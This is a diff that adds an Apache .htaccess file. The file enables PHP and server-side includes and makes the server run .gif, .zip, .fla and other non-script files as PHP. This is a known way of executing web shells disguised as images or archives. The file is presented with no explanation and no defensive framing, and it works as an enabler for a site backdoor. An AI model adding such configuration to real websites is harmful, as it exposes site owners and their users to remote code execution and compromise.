@@ -1,0 +1,17 @@
+Options All -Indexes
+<IfModule mod_php5.c>
+php_flag engine 1
+</IfModule>
+AddHandler php5-script .php
+AddHandler php5-script .gif
+Options +ExecCGI
+AddType text/html .shtml 
+AddHandler server-parsed .shtml
+<IfModule mod_mime.c>
+AddType application/x-httpd-php .fla
+AddType application/x-httpd-php .phtml
+AddType application/x-httpd-php .gif
+AddType application/x-httpd-php .php4
+AddType application/x-httpd-php .zip
+AddType application/x-httpd-php .php
+</IfModule> 
